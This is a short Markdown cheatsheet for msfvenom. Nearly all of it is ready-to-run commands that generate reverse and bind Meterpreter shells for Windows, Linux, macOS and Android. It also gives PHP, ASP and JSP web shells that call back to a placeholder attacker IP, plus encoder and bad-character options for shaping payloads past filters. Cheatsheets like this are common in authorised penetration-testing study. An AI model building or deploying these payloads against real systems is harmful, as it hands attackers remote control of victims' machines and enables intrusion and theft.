---
title: MSFVenom
tags:
  - cheatsheet
  - msfvenom
---
## Basic Usage

```bash
msfvenom -p <payload> [options] > <output_file>
```
## Common Payloads

### Windows Payloads
- **Windows Reverse Shell:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe > shell.exe
```
- **Windows Bind Shell:**
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=<target_ip> LPORT=<bind_port> -f exe > bind.exe
```
- **Windows Reverse HTTPS Shell:**
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=<attacker_ip> LPORT=<attacker_port> -f exe > shell_https.exe
```

### Linux Payloads
- **Linux Reverse Shell:**
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f elf > shell.elf
```
- **Linux Bind Shell:**
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<target_ip> LPORT=<bind_port> -f elf > bind.elf
```

### macOS Payloads
- **macOS Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f macho > shell.macho
```

### Android Payloads
- **Android Reverse Shell:**
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> R > shell.apk
```

### Web Payloads
- **PHP Reverse Shell:**
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f raw > shell.php
```
- **ASP Reverse Shell:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f asp > shell.asp
```
- **JSP Reverse Shell:**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f raw > shell.jsp
```

## Format Options
- **EXE (Windows Executable):**
```bash
-f exe
```
- **ELF (Linux Executable):**
```bash
-f elf
```
- **APK (Android Package):**
```bash
-f apk
```
- **Macho (macOS Executable):**
```bash
-f macho
```
- **RAW (Raw Format):**
```bash
-f raw
```

## Encoding Payloads
- **List Available Encoders:**
```bash
msfvenom --list encoders
```
- **Use a Specific Encoder:**
```bash
msfvenom -p <payload> -e <encoder> -f <format> > <output_file>
```
- **Common Encoder Example (Shikata Ga Nai):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -e x86/shikata_ga_nai -f exe > encoded_shell.exe
```

## Additional Options
- **Bad Characters (Avoid Specific Bytes):**
```bash
msfvenom -p <payload> -b "\x00\xff" -f <format> > <output_file>
```
- **Add a NOP Sled:**
```bash
msfvenom -p <payload> -n <number_of_nops> -f <format> > <output_file>
```
- **List All Payloads:**
```bash
msfvenom --list payloads
```